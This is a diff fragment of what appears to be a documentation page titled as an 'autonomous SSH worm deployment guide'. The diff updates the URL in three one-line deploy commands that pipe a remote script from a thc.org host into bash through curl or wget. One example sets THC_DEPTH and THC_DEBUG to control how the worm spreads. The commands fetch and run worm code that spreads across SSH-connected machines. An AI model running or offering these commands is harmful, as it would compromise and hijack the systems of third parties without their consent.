@@ -13,13 +13,13 @@ description: Autonomous SSH worm deployment guide.
 Use either one of these commands to deploy:
 
 ```shell
-bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
 or:
 
 ```shell
-bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
+bash -c "$(wget --no-verbose -O- https://thc.org/ssh-it/x)"
 ```
 
 {:refdef: style="text-align: center;"}
@@ -56,7 +56,7 @@ Deployment can be controlled with these environment variables
 Example:
 
 ```shell
-THC_DEPTH=6 THC_DEBUG=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+THC_DEPTH=6 THC_DEBUG=1 bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
 ## Tips & Tricks
